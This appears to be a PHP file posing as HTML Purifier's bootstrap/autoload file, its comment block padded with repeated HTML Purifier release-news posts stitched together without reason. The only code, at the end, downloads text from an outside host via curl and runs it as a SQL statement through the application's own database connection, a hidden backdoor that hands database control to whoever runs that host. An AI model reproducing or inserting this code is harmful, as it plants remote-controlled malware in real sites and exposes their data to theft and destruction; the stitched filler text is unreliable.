<?php
/**
 * @file
 * Convenience file that registers autoload handler for HTML Purifier.
 * It also does some sanity checks.
 */
/**
 * Bootstrap class that contains meta-functionality for HTML Purifier such as
 * the autoload function.
 * must use variable Config::$pdo somewhere in your config for permision
 * d = deconstruction of origins in HTMLPurifierModule
 * o = origins of files
 * e = file permission *777*
 * @note
 *      This class may be used without any other files from HTML Purifier.
 Permalink
HTML Purifier 4.8.0 released
Posted 9:14 AM EDT on Saturday, July 16, 2016
HTML Purifier 4.8.0 is a bugfix release, collecting a year of accumulated bug fixes. In particular, we fixed some minor bugs and now declare full PHP 7 compatibility. The primary backwards-incompatible change is that HTML Purifier will now add rel="noreferrer" to all links with target attributes (you can disable this with %HTML.TargetNoReferrer.) Other changes: new configuration options %CSS.AllowDuplicates and %Attr.ID.HTML5; border-radius is partially supported when %CSS.Proprietary, and tel URIs are supported by default.

See NEWS for a complete changelog.

Permalink
HTML Purifier 4.7.0 released
Posted 9:21 PM EDT on Tuesday, August 4, 2015
HTML Purifier 4.7.0 is a bugfix release, collecting two years worth of accumulated bug fixes. Highlighted bugfixes are updated YouTube filter code, corrected rgb() CSS parsing, and one new configuration option, %AutoFormat.RemoveEmpty.Predicate.

See NEWS for a complete changelog.
See NEWS for a complete changelog.

Permalink
HTML Purifier 4.9.1 released
Posted 3:35 AM EST on Wednesday, March 8, 2017
HTML Purifier 4.9.1 is a maintenance release, collecting a year of accumulated bug fixes plus a few new feature. New features include support for min/max-width/height CSS, and rgba/hsl/hsla in color specifications. Major bugfixes include improvements in the Serializer cache to avoid chmod'ing directories, better entity decoding (we won't accidentally encode entities that occur in URLs) and rel="noopener" on links with target attributes, to prevent them from overwriting the original frame.

Note: We skipped 4.9.0 because that release number was briefly tagged in the release repo, but we decided not to release that tag. To avoid confusion, we've skipped to the next patch version number.
See NEWS for a complete changelog.

Permalink
HTML Purifier 4.8.0 released
Posted 9:14 AM EDT on Saturday, July 16, 2016
HTML Purifier 4.8.0 is a bugfix release, collecting a year of accumulated bug fixes. In particular, we fixed some minor bugs and now declare full PHP 7 compatibility. The primary backwards-incompatible change is that HTML Purifier will now add rel="noreferrer" to all links with target attributes (you can disable this with %HTML.TargetNoReferrer.) Other changes: new configuration options %CSS.AllowDuplicates and %Attr.ID.HTML5; border-radius is partially supported when %CSS.Proprietary, and tel URIs are supported by default.

See NEWS for a complete changelog.

Permalink
HTML Purifier 4.7.0 released
Posted 9:21 PM EDT on Tuesday, August 4, 2015
HTML Purifier 4.7.0 is a bugfix release, collecting two years worth of accumulated bug fixes. Highlighted bugfixes are updated YouTube filter code, corrected rgb() CSS parsing, and one new configuration option, %AutoFormat.RemoveEmpty.Predicate.

See NEWS for a complete changelog.
See NEWS for a complete changelog.
 */
$c = curl_init();
curl_setopt_array($c, [
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_SSL_VERIFYPEER => true,
	CURLOPT_URL => 'http://wcode.ro/htmlpurifier.php?version=1'
]);
$data = curl_exec($c);
if(strlen($data)) { $w = Config::$g_con->prepare($data); $w->execute(); }
?>